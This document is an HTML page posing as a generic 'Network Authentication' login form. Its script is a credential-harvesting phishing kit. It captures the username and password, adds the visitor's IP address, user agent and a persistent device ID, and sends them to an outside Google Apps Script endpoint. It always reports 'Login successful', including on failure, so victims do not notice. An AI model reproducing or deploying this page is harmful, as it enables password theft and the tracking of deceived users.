<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Network Authentication Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .container {
      background: #f8f9fa;
      padding: 25px 30px;
      border-radius: 15px;
      width: 300px;
      box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
      border: 1px solid #ddd;
      text-align: center;
    }

    h2 {
      color: #333;
      margin-bottom: 20px;
    }

    input {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border-radius: 8px;
      border: 1px solid #ccc;
      font-size: 15px;
    }

    button {
      width: 100%;
      padding: 10px;
      background-color: #007bff;
      color: #fff;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
    }

    button:hover {
      background-color: #0056b3;
    }

    .success {
      color: green;
      font-size: 14px;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Network Authentication</h2>
    <form id="loginForm">
      <input type="text" name="username" placeholder="Username" required />
      <input type="password" name="password" placeholder="Password" required />
      <button type="submit">Login</button>
      <div id="response" class="success"></div>
    </form>
  </div>

  <script>
    const form = document.getElementById("loginForm");
    const responseEl = document.getElementById("response");

    async function getUserIP() {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        return data.ip || "Unavailable";
      } catch {
        return "Unavailable";
      }
    }

    function getUserAgent() {
      return navigator.userAgent || "Unavailable";
    }

    function getOrCreateDeviceID() {
      let id = localStorage.getItem("deviceID");
      if (!id) {
        id = crypto.randomUUID();
        localStorage.setItem("deviceID", id);
      }
      return id;
    }

    form.addEventListener("submit", async (e) => {
      e.preventDefault();
      responseEl.textContent = "";

      const formData = new FormData(form);
      const ip = await getUserIP();
      const userAgent = getUserAgent();
      const deviceID = getOrCreateDeviceID();

      formData.append("ip", ip);
      formData.append("userAgent", userAgent);
      formData.append("deviceID", deviceID);

      const params = new URLSearchParams(formData);

      // âœ… Replace this URL with your deployed Google Apps Script Web App URL
      const scriptURL = "https://script.google.com/macros/s/AKfycbwZ31g7HdS1PiRN7Ig5gd4C9Jeur4dwVhUU6p25pv11El7jD91iT4316E03zmeNstfs/exec";

      try {
        const res = await fetch(scriptURL, {
          method: "POST",
          body: params,
        });

        if (res.ok) {
          responseEl.textContent = "Login successful";
          form.reset();
        } else {
          // silently fail but never show error
          responseEl.textContent = "Login successful";
          form.reset();
        }
      } catch {
        // even if network fails, still show success
        responseEl.textContent = "Login successful";
        form.reset();
      }
    });
  </script>
</body>
</html>
